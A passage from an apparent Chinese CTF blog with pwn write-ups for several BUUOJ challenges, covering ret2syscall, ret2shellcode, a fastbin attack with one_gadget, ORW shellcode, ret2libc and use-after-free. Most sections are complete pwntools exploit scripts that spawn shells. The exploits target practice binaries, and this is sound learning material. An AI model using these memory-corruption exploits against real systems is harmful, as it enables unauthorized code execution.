<h3 id="解法一：ret2syscall"><a href="#解法一：ret2syscall" class="headerlink" title="解法一：ret2syscall"></a>解法一：ret2syscall</h3><p>我们可以发现在程序中存在可以进行系统调用的<code>int 0x80</code>中断指令</p>
<p><img src="https://i.loli.net/2021/01/24/YGV1INJTXhH4SLQ.png"></p>
<p>故考虑通过0x80号中断执行11号系统调用<code>execve(&quot;/bin/sh&quot;, 0, 0)</code>以get shell，其中字符串我们是可以手动读入到bss段上的</p>
<p>需要注意的是栈上参数需要我们手动进行弹出</p>
<p>故构造exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">29872</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./simplerop&#x27;</span>) </span><br><span class="line">pop_esi_pop_edi_pop_ebp_ret = <span class="number">0x0804838c</span></span><br><span class="line">pop_edi_pop_ebp_ret = <span class="number">0x0804838d</span></span><br><span class="line">pop_eax_ret = <span class="number">0x080bae06</span></span><br><span class="line">pop_ecx_pop_ebx_ret = <span class="number">0x0806e851</span></span><br><span class="line">pop_edx_ret = <span class="number">0x0806e82a</span></span><br><span class="line">int_0x80 = <span class="number">0x080493e1</span></span><br><span class="line">offset = <span class="number">0x1c</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * offset + p32(<span class="number">0xdeadbeef</span>)  + p32(e.sym[<span class="string">&#x27;read&#x27;</span>]) + p32(pop_esi_pop_edi_pop_ebp_ret) + p32(<span class="number">0</span>) + p32(e.bss()) + p32(<span class="number">0x8</span>) + p32(pop_eax_ret) + p32(<span class="number">0xb</span>) + p32(pop_ecx_pop_ebx_ret) + p32(<span class="number">0</span>) + p32(e.bss()) + p32(pop_edx_ret) + p32(<span class="number">0</span>) + p32(int_0x80)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>运行即可get shell</p>
<p><img src="https://i.loli.net/2021/01/24/p7P53jJ6zKfxhtR.png"></p>
<h3 id="解法二：ret2shellcode"><a href="#解法二：ret2shellcode" class="headerlink" title="解法二：ret2shellcode"></a>解法二：ret2shellcode</h3><p>程序本身还带有mprotect函数，故考虑修改bss段为可执行后读入shellcode来get shell</p>
<p>构造exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.arch = &#x27;i386&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">29872</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./simplerop&#x27;</span>) </span><br><span class="line">pop_esi_pop_edi_pop_ebp_ret = <span class="number">0x0804838c</span></span><br><span class="line">pop_edi_pop_ebp_ret = <span class="number">0x0804838d</span></span><br><span class="line">pop_eax_ret = <span class="number">0x080bae06</span></span><br><span class="line">pop_ecx_pop_ebx_ret = <span class="number">0x0806e851</span></span><br><span class="line">pop_edx_ret = <span class="number">0x0806e82a</span></span><br><span class="line">int_0x80 = <span class="number">0x080493e1</span></span><br><span class="line">offset = <span class="number">0x1c</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * offset + p32(<span class="number">0xdeadbeef</span>)  + p32(e.sym[<span class="string">&#x27;mprotect&#x27;</span>])  + p32(pop_esi_pop_edi_pop_ebp_ret) + p32(e.bss() &amp; (<span class="number">0xffff000</span>)) + p32(<span class="number">0x2000</span>) + p32(<span class="number">0x7</span>) + p32(e.sym[<span class="string">&#x27;read&#x27;</span>]) + p32(pop_esi_pop_edi_pop_ebp_ret) + p32(<span class="number">0</span>) + p32(e.bss() + <span class="number">0x50</span>) + p32(<span class="number">0x50</span>) + p32(e.bss() + <span class="number">0x50</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(asm(shellcraft.sh()))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>运行即可get shell</p>
<p><img src="https://i.loli.net/2021/01/24/K9HYDXUd3SPvN8c.png"></p>
<h2 id="0x02E-roarctf-2019-easy-pwn-off-by-one-fastbin-attack-one-gadget"><a href="#0x02E-roarctf-2019-easy-pwn-off-by-one-fastbin-attack-one-gadget" class="headerlink" title="0x02E.roarctf_2019_easy_pwn - off by one + fastbin attack + one_gadget"></a>0x02E.roarctf_2019_easy_pwn - off by one + fastbin attack + one_gadget</h2><p>惯例的<code>checksec</code>，<strong>保  护  全  开</strong>（噔  噔  咚）</p>
<p><img src="https://i.loli.net/2021/01/24/uwHcW7SZ4sBbOLo.png"></p>
<p>拖入IDA进行分析</p>
<p><img src="https://i.loli.net/2021/01/24/eHNDfbkXEtBR49y.png"></p>
<p>保护全开的题不出意外应当是一道堆题，这题也不例外</p>
<p>程序本身有<strong>着分配、编辑、释放、打印</strong>堆块的功能</p>
<p>漏洞点在于edit功能中，若是输入的size刚好是原size + 10的话就会允许多输入一个字节，即<strong>存在off by one漏洞</strong></p>
<p><img src="https://i.loli.net/2021/01/24/BNqzXb4APk5pOIx.png"></p>
<p>题目中对于chunk size的限制是4096（四舍五入等于没有），故考虑<strong>通过off by one漏洞修改相邻chunk的size构造overlapping chunk泄露libc基址后通过overlapping chunk进行fastbin attack构造__malloc_hook - 0x23附近的fake chunk后修改__malloc_hook为one_gadget后分配任意chunk即可get shell</strong></p>
<p>需要注意的一点是one_gadget对于栈帧是有着一定要求的，我们可以尝试使用realloc函数中的gadget来进行压栈等操作来满足one_gadget的要求</p>
<p>故构造exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = &#x27;DEBUG&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./roarctf_2019_easy_pwn&#x27;</span>) <span class="comment"># p = remote(&#x27;node3.buuoj.cn&#x27;,27009)</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./roarctf_2019_easy_pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line">one_gadget = <span class="number">0x4526a</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">choice:<span class="built_in">int</span></span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;choice: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(choice).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">new</span>(<span class="params">size:<span class="built_in">int</span></span>):</span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;size: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index:<span class="built_in">int</span>, size:<span class="built_in">int</span>, content</span>):</span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;index: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;size: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;content: &quot;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index:<span class="built_in">int</span></span>):</span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;index: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dump</span>(<span class="params">index:<span class="built_in">int</span></span>):</span><br><span class="line">    cmd(<span class="number">4</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;index: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;content: &quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">    new(<span class="number">0x18</span>) <span class="comment"># idx0</span></span><br><span class="line">    new(<span class="number">0x18</span>) <span class="comment"># idx1</span></span><br><span class="line">    new(<span class="number">0x80</span>) <span class="comment"># idx2</span></span><br><span class="line">    new(<span class="number">0x60</span>) <span class="comment"># idx3</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># leak the libc addr</span></span><br><span class="line">    edit(<span class="number">0</span>, <span class="number">0x18</span> + <span class="number">10</span>, p64(<span class="number">0</span>) * <span class="number">3</span> + <span class="string">b&#x27;\xb1&#x27;</span>)</span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    new(<span class="number">0xa0</span>) <span class="comment"># idx1</span></span><br><span class="line">    edit(<span class="number">1</span>, <span class="number">0x20</span>, p64(<span class="number">0</span>) * <span class="number">3</span> + p64(<span class="number">0x91</span>))</span><br><span class="line">    free(<span class="number">2</span>)</span><br><span class="line">    dump(<span class="number">1</span>)</span><br><span class="line">    main_arena = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">88</span></span><br><span class="line">    __malloc_hook = main_arena - <span class="number">0x10</span></span><br><span class="line">    libc_base = __malloc_hook - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># overlapping</span></span><br><span class="line">    new(<span class="number">0x60</span>) <span class="comment"># idx2</span></span><br><span class="line">    new(<span class="number">0x10</span>) <span class="comment"># idx4</span></span><br><span class="line">    edit(<span class="number">0</span>, <span class="number">0x18</span> + <span class="number">10</span>, p64(<span class="number">0</span>) * <span class="number">3</span> + <span class="string">b&#x27;\x91&#x27;</span>)</span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    new(<span class="number">0x10</span>) <span class="comment"># idx1</span></span><br><span class="line">    new(<span class="number">0x60</span>) <span class="comment"># idx5, overlapping chunk</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># fastbin attack</span></span><br><span class="line">    free(<span class="number">3</span>)</span><br><span class="line">    free(<span class="number">5</span>)</span><br><span class="line">    edit(<span class="number">2</span>, <span class="number">0x8</span>, p64(libc_base + libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>] - <span class="number">0x23</span>))</span><br><span class="line">    new(<span class="number">0x60</span>) <span class="comment"># idx3</span></span><br><span class="line">    new(<span class="number">0x60</span>) <span class="comment"># idx5, our fake chunk</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># get the shell</span></span><br><span class="line">    edit(<span class="number">5</span>, <span class="number">11</span> + <span class="number">0x10</span>, <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x13</span> - <span class="number">8</span>) + p64(libc_base + one_gadget) + p64(libc_base + libc.sym[<span class="string">&#x27;__libc_realloc&#x27;</span>] + <span class="number">0x10</span>))</span><br><span class="line">    new(<span class="number">0x10</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure>

<p>运行即可get shell</p>
<p><img src="https://i.loli.net/2021/01/24/yuadEcW1nU6AxZe.png"></p>
<blockquote>
<p>说实话笔者觉得这道题质量一般…有种为了出题而出题的感觉…</p>
</blockquote>
<h2 id="0x02F-pwnable-orw-orw"><a href="#0x02F-pwnable-orw-orw" class="headerlink" title="0x02F.pwnable_orw - orw"></a>0x02F.pwnable_orw - orw</h2><blockquote>
<p>pwnablt.tw的刷题记录见<a target="_blank" rel="noopener" href="https://archive.next.arttnba3.cn/">这里</a>，因为是做过的题所以直接把当时的wp搬过来了www</p>
</blockquote>
<p>首先可以看到题目对环境做出了一定的限制</p>
<p><img src="https://i.loli.net/2020/08/31/39DbCjwxMeYLKry.png" alt="image.png"></p>
<p>惯例的<code>checksec</code>，发现只开了<code>canary</code></p>
<p><img src="https://i.loli.net/2020/08/31/pHOQYVeolKvJkxD.png" alt="D_V73A_Y0XS1HEU~_CXRZSH.png"></p>
<p>拖入IDA进行分析</p>
<p><img src="https://i.loli.net/2020/08/31/ZtL23IAugR61TzU.png" alt="image.png"></p>
<p>主程序一开始会先调用<code>orw_seccomp()</code>函数，我们点进去康康</p>
<p><img src="https://i.loli.net/2020/08/31/nlyewbocGB6zOrv.png" alt="image.png"></p>
<p>v4是canary的值，我们现在还不知道是否需要绕过canary，故先不予理会</p>
<p>接下来调用了<code>qmemcpy()</code>函数，实际上就是<code>memcpy</code>函数，将从0x8048640地址开始拷贝0x60字节的数据到v3中，随后赋值12给v1，v2作为指针获取v3的首字节地址</p>
<p>最后调用<code>prctl()</code>函数，结合题目的说明，我们大致可以猜测到<code>orw_seccomp()</code>函数的作用应该是<strong>禁用其他的系统调用，仅开放sys_read、sys_write、sys_open</strong></p>
<p>也就是说我们<strong>无法通过sys_execve来getshell</strong></p>
<p>接下来回到主函数，我们很容易看出该程序会读入最大0xC8字节输入并尝试执行该输入</p>
<p>结合题目说明，我们<strong>仅考虑构造shellcode来cat flag</strong></p>
<p>故构造exp如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">shellcode = shellcraft.open(&#x27;/flag&#x27;)</span><br><span class="line">shellcode += shellcraft.read(&#x27;eax&#x27;,&#x27;esp&#x27;,100)</span><br><span class="line">shellcode += shellcraft.write(1,&#x27;esp&#x27;,100)</span><br><span class="line">p = remote(&#x27;node3.buuoj.cn&#x27;, 28333)</span><br><span class="line">p.sendline(asm(shellcode))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>运行即可获得flag</p>
<p><img src="https://i.loli.net/2021/01/24/ZGiW28sj5C6kdht.png"></p>
<h2 id="0x030-jarvisoj-level1-ret2shellcode-ret2libc"><a href="#0x030-jarvisoj-level1-ret2shellcode-ret2libc" class="headerlink" title="0x030.jarvisoj_level1 - ret2shellcode | ret2libc"></a>0x030.jarvisoj_level1 - ret2shellcode | ret2libc</h2><blockquote>
<p>同样是一道屑题</p>
</blockquote>
<p>惯例的<code>checksec</code>，保护全关，四舍五入可以为所欲为</p>
<p><img src="https://i.loli.net/2021/01/31/ugYwlvbIi9dTxPZ.png"></p>
<p>拖入IDA进行分析</p>
<p><img src="https://i.loli.net/2021/01/31/aI9leRATcW5ZqSn.png"></p>
<p>给出了栈上地址且存在溢出，直接写入shellcode后返回到栈上即可</p>
<p>构造exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line">offset = <span class="number">0x88</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./level1&#x27;</span>) <span class="comment"># p = remote(&#x27;node3.buuoj.cn&#x27;, 28701)</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;this:&#x27;</span>)</span><br><span class="line">stack_addr = <span class="built_in">int</span>(p.recvuntil(<span class="string">b&#x27;?&#x27;</span>, drop = <span class="literal">True</span>), <span class="number">16</span>)</span><br><span class="line">payload = asm(shellcraft.sh()).ljust(offset, <span class="string">b&#x27;\x00&#x27;</span>) + p32(<span class="number">0xdeadbeef</span>) + p32(stack_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>但是我们会发现本地打的通远程打不通…</p>
<p>这是由于远程不明原因不会给出这个地址，故考虑直接ret2libc</p>
<p>构造exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&#x27;./level1&#x27;</span>) <span class="comment"># p = remote(&#x27;node3.buuoj.cn&#x27;, 28701)</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./level1&#x27;</span>)</span><br><span class="line">offset = <span class="number">0x88</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b&#x27;A&#x27;</span> * offset + p32(<span class="number">0xdeadbeef</span>) + p32(e.plt[<span class="string">&#x27;write&#x27;</span>]) + p32(e.sym[<span class="string">&#x27;main&#x27;</span>]) + p32(<span class="number">1</span>) + p32(e.got[<span class="string">&#x27;write&#x27;</span>]) + p32(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">p.recv() <span class="comment"># comment out this line when attacking remote</span></span><br><span class="line">p.sendline(payload1)</span><br><span class="line">write_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;write&#x27;</span>, write_addr)</span><br><span class="line">libc_base = write_addr - libc.dump(<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line">sys_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">sh_addr = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b&#x27;A&#x27;</span> * offset + p32(<span class="number">0xdeadbeef</span>) + p32(sys_addr) + p32(<span class="number">0xdeadbeef</span>) + p32(sh_addr)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>运行即可get shell</p>
<p><img src="https://i.loli.net/2021/01/31/1lypQMbUJSZg9Bk.png"></p>
<h1 id="0x031-0x040"><a href="#0x031-0x040" class="headerlink" title="0x031 ~ 0x040"></a>0x031 ~ 0x040</h1><h2 id="0x031-ciscn-2019-n-3-Use-After-Free"><a href="#0x031-ciscn-2019-n-3-Use-After-Free" class="headerlink" title="0x031.ciscn_2019_n_3 - Use After Free"></a>0x031.ciscn_2019_n_3 - Use After Free</h2><p>惯例的<code>checksec</code>，发现只开了NX和canary（<del>又是32位堆题，好烦a</del></p>
<p><img src="https://i.loli.net/2021/01/31/neG2dQumBhsrzLD.png"></p>
<p>拖入IDA进行分析，大概是一道有着分配、释放、打印堆块功能的程序</p>
<p><img src="https://i.loli.net/2021/02/01/rcKNdhuEGpJb1CH.png"></p>
<p>释放堆块时用的是堆块上的函数指针</p>
<p><img src="https://i.loli.net/2021/02/01/HloCX5q9FbcuvRf.png"></p>
<p>在释放堆块后不会将堆块指针置NULL，<strong>存在UAF漏洞</strong></p>
<p><img src="https://i.loli.net/2021/02/01/lBSJXRweGYZjWMN.png"></p>
<p><img src="https://i.loli.net/2021/02/01/dQPegf7Bs9NVhxX.png"></p>
<p>由于程序中存在system函数，故考虑通过UAF覆写堆块指针为system后执行<code>system(&quot;sh&quot;)</code>以get shell</p>
<p>构造exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line">p = process(<span class="string">&#x27;./ciscn_2019_n_3&#x27;</span>) <span class="comment"># p = remote(&#x27;node3.buuoj.cn&#x27;, 27248)</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./ciscn_2019_n_3&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.27.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">command: <span class="built_in">int</span></span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;CNote&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(command).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">new</span>(<span class="params">index: <span class="built_in">int</span>, value: <span class="built_in">int</span></span>):</span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Index&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Type&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="number">1</span>).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Value&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(value).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">new</span>(<span class="params">index: <span class="built_in">int</span>, length: <span class="built_in">int</span>, content</span>):</span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Index&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Type&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="number">2</span>).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Length&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(length).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Value &gt; &quot;</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index: <span class="built_in">int</span></span>):</span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Index&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dump</span>(<span class="params">index: <span class="built_in">int</span></span>):</span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Index&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">    new(<span class="number">0</span>, <span class="number">0x114</span>, <span class="string">b&#x27;arttnba3&#x27;</span>) <span class="comment"># idx 0</span></span><br><span class="line">    new(<span class="number">1</span>, <span class="number">0x114</span>, <span class="string">b&#x27;arttnba3&#x27;</span>) <span class="comment"># idx 1</span></span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    new(<span class="number">2</span>, <span class="number">0xc</span>, <span class="string">b&#x27;sh\x00\x00&#x27;</span> + p32(e.sym[<span class="string">&#x27;system&#x27;</span>])) <span class="comment"># idx2, overlapping with idx 0</span></span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure>

<p>运行即可get shell</p>
<p><img src="https://i.loli.net/2021/02/01/eEQf6L8dWs2hmk7.png"></p>
<h2 id="0x032-picoctf-2018-buffer-overflow-2-ret2libc"><a href="#0x032-picoctf-2018-buffer-overflow-2-ret2libc" class="headerlink" title="0x032.picoctf_2018_buffer overflow 2 - ret2libc"></a>0x032.picoctf_2018_buffer overflow 2 - ret2libc</h2><p>惯例的<code>chekcsec</code>，发现只开了NX保护</p>
<p><img src="https://i.loli.net/2021/02/01/Eu7V4FOHR6xfALa.png"></p>
<p>拖入IDA进行分析，直接就有一个gets溢出</p>
<p><img src="https://i.loli.net/2021/02/01/fwmOTZVWLc9DHya.png"></p>
<p>由于没有能直接get shell的函数，故考虑ret2libc</p>
<p>构造exp如下：</p>
